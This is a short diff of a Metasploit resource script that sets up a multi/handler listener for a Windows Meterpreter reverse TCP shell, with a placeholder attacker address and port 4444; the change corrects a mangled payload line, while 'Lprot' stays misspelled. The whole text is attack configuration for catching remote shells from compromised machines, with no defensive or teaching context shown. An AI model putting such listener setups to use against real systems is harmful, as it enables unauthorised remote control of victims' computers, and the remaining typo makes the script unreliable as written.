@@ -1,5 +1,5 @@
 use exploit/multi/handler 
-set paylset payload windows/meterpretre/reverse_tcp 
+Set payload windows/meterpreter/reverse_tcp
 set Lhost MYIP
 set Lprot 4444
 set exitonsession false
